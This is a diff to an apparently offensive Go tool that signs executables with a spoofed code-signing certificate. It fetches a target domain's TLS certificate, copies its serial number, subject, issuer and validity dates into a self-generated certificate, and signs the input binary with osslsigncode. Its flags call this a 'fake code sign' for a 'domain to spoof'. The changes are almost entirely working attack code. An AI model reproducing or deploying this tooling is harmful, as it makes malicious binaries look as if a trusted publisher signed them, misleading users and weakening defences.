@@ -1,12 +1,22 @@
 package main
 
 import (
+	"bytes"
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/tls"
+	"crypto/x509"
+	"crypto/x509/pkix"
+	"encoding/pem"
 	"flag"
 	"fmt"
 	"io"
 	"log"
+	crand "math/rand"
 	"os"
 	"os/exec"
+	"strings"
+	"time"
 
 	"github.com/fatih/color"
 )
@@ -33,30 +43,135 @@ func printDebug(format string, v ...interface{}) {
 	}
 }
 
-func GeneratePFK(domain string, password string, pfx string) {
+const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
 
-	cmd := exec.Command("openssl", "req", "-x509", "-newkey", "rsa:4096", "-passout", "pass:"+password+"", "-sha256", "-keyout", ""+domain+".key", "-out", ""+domain+".crt", "-subj", "/CN="+domain+"", "-days", "600")
-	err := cmd.Run()
-	if err != nil {
-		log.Fatalf("cmd.Run() failed with %s\n", err)
+func VarNumberLength(min, max int) string {
+	var r string
+	crand.Seed(time.Now().UnixNano())
+	num := crand.Intn(max-min) + min
+	n := num
+	r = RandStringBytes(n)
+	return r
+}
+func RandStringBytes(n int) string {
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = letters[crand.Intn(len(letters))]
+
 	}
-	printDebug("[!] Created - %s and %s \n", domain+".key", domain+".crt")
-	cmd = exec.Command("openssl", "pkcs12", "-export", "-name", ""+domain+"", "-passin", "pass:"+password+"", "-passout", "pass:"+password+"", "-out", pfx, "-inkey", ""+domain+".key", "-in", ""+domain+".crt")
-	err = cmd.Run()
-	if err != nil {
-		log.Fatalf("cmd.Run() failed with %s\n", err)
-	}
-	printDebug("[!] Created - %s\n", domain+".pfx")
+	return string(b)
 }
 
-func SignExecutable(domain string, password string, pfx string, filein string, fileout string) {
+func GenerateCert(domain string, inputFile string) {
+	var err error
+	rootKey, err := rsa.GenerateKey(rand.Reader, 4096)
+	if err != nil {
+		panic(err)
+	}
+	certs, err := GetCertificatesPEM(domain + ":443")
+	if err != nil {
+		os.Chdir("..")
+		foldername := strings.Split(inputFile, ".")
+		os.RemoveAll(foldername[0])
+		log.Fatal("Error: The domain: " + domain + " does not exist or is not accessible from the host you are compiling on")
+	}
+	block, _ := pem.Decode([]byte(certs))
+	cert, _ := x509.ParseCertificate(block.Bytes)
 
-	cmd := exec.Command("osslsigncode", "sign", "-pkcs12", pfx, "-n", ""+domain+"", "-in", ""+filein+"", "-out", ""+fileout+"", "-pass", ""+password+"")
+	keyToFile(domain+".key", rootKey)
+
+	SubjectTemplate := x509.Certificate{
+		SerialNumber: cert.SerialNumber,
+		Subject: pkix.Name{
+			CommonName: cert.Subject.CommonName,
+		},
+		NotBefore:             cert.NotBefore,
+		NotAfter:              cert.NotAfter,
+		BasicConstraintsValid: true,
+		IsCA:                  true,
+		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
+		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth, x509.ExtKeyUsageClientAuth},
+	}
+	IssuerTemplate := x509.Certificate{
+		SerialNumber: cert.SerialNumber,
+		Subject: pkix.Name{
+			CommonName: cert.Issuer.CommonName,
+		},
+		NotBefore: cert.NotBefore,
+		NotAfter:  cert.NotAfter,
+	}
+	derBytes, err := x509.CreateCertificate(rand.Reader, &SubjectTemplate, &IssuerTemplate, &rootKey.PublicKey, rootKey)
+	if err != nil {
+		panic(err)
+	}
+	certToFile(domain+".pem", derBytes)
+
+}
+
+func keyToFile(filename string, key *rsa.PrivateKey) {
+	file, err := os.Create(filename)
+	if err != nil {
+		panic(err)
+	}
+	defer file.Close()
+	b, err := x509.MarshalPKCS8PrivateKey(key)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "Unable to marshal RSA private key: %v", err)
+		os.Exit(2)
+	}
+	if err := pem.Encode(file, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: b}); err != nil {
+		panic(err)
+	}
+}
+
+func certToFile(filename string, derBytes []byte) {
+	certOut, err := os.Create(filename)
+	if err != nil {
+		log.Fatalf("[-] Failed to Open cert.pem for Writing: %s", err)
+	}
+	if err := pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes}); err != nil {
+		log.Fatalf("[-] Failed to Write Data to cert.pem: %s", err)
+	}
+	if err := certOut.Close(); err != nil {
+		log.Fatalf("[-] Error Closing cert.pem: %s", err)
+	}
+}
+
+func GetCertificatesPEM(address string) (string, error) {
+	conn, err := tls.Dial("tcp", address, &tls.Config{
+		InsecureSkipVerify: true,
+	})
+	if err != nil {
+		return "", err
+	}
+	defer conn.Close()
+	var b bytes.Buffer
+	for _, cert := range conn.ConnectionState().PeerCertificates {
+		err := pem.Encode(&b, &pem.Block{
+			Type:  "CERTIFICATE",
+			Bytes: cert.Raw,
+		})
+		if err != nil {
+			return "", err
+		}
+	}
+	return b.String(), nil
+}
+
+func GeneratePFK(password string, domain string) {
+	cmd := exec.Command("openssl", "pkcs12", "-export", "-out", domain+".pfx", "-inkey", domain+".key", "-in", domain+".pem", "-passin", "pass:"+password+"", "-passout", "pass:"+password+"")
 	err := cmd.Run()
 	if err != nil {
 		log.Fatalf("cmd.Run() failed with %s\n", err)
 	}
-	printDebug("[!] Created and Signed - %s\n", fileout)
+}
+
+func SignExecutable(password string, pfx string, filein string, fileout string) {
+	cmd := exec.Command("osslsigncode", "sign", "-pkcs12", pfx, "-in", ""+filein+"", "-out", ""+fileout+"", "-pass", ""+password+"")
+	err := cmd.Run()
+	if err != nil {
+		log.Fatalf("cmd.Run() failed with %s\n", err)
+	}
 }
 
 func Check(check string) {
@@ -74,7 +189,7 @@ func options() *FlagOptions {
 	outFile := flag.String("O", "", "Signed file name")
 	inputFile := flag.String("I", "", "Unsiged file name to be signed")
 	domain := flag.String("Domain", "", "Domain you want to create a fake code sign for")
-	password := flag.String("Password", "", "Password for real or fake certificate")
+	password := flag.String("Password", "", "Password for real certificate")
 	real := flag.String("Real", "", "Path to a valid .pfx certificate file")
 	verify := flag.String("Verify", "", "Verifies a file's code sign certificate")
 	debug := flag.Bool("debug", false, "Print debug statements")
@@ -110,9 +225,6 @@ func main() {
 	if opt.real == "" && opt.domain == "" && opt.verify == "" {
 		log.Fatal("Error: Please specify a valid path to a .pfx file or specify the domain to spoof")
 	}
-	if opt.verify == "" && opt.password == "" {
-		log.Fatal("Error: Please specify a password for the signing")
-	}
 
 	if opt.verify != "" {
 		fmt.Println("[*] Checking code signed on file: " + opt.verify)
@@ -122,21 +234,24 @@ func main() {
 
 	if opt.real != "" {
 		fmt.Println("[*] Signing " + opt.inputFile + " with a valid cert " + opt.real)
-		SignExecutable(opt.domain, opt.password, opt.real, opt.inputFile, opt.outFile)
+		SignExecutable(opt.password, opt.real, opt.inputFile, opt.outFile)
 
 	} else {
+		password := VarNumberLength(8, 12)
 		pfx := opt.domain + ".pfx"
-		fmt.Println("[*] Signing " + opt.inputFile + " with a fake cert " + pfx)
-		GeneratePFK(opt.domain, opt.password, pfx)
-		SignExecutable(opt.domain, opt.password, pfx, opt.inputFile, opt.outFile)
+		fmt.Println("[*] Signing " + opt.inputFile + " with a fake cert")
+		GenerateCert(opt.domain, opt.inputFile)
+		GeneratePFK(password, opt.domain)
+		SignExecutable(password, pfx, opt.inputFile, opt.outFile)
+
 	}
 	fmt.Println("[*] Cleaning up....")
-	printDebug("[!] Deleting %s\n", opt.domain+".crt")
-	os.Remove("" + opt.domain + ".crt")
-	printDebug("[!] Deleting %s\n", opt.domain+".key")
-	os.Remove("" + opt.domain + ".key")
-	printDebug("[!] Deleting %s\n", opt.domain+".pfx")
-	os.Remove("" + opt.domain + ".pfx")
+	printDebug("[!] Deleting " + opt.domain + ".pem\n")
+	os.Remove(opt.domain + ".pem")
+	printDebug("[!] Deleting " + opt.domain + ".key\n")
+	os.Remove(opt.domain + ".key")
+	printDebug("[!] Deleting " + opt.domain + ".pfx\n")
+	os.Remove(opt.domain + ".pfx")
 	fmt.Println(color.GreenString("[+] ") + "Signed File Created.")
 
 }
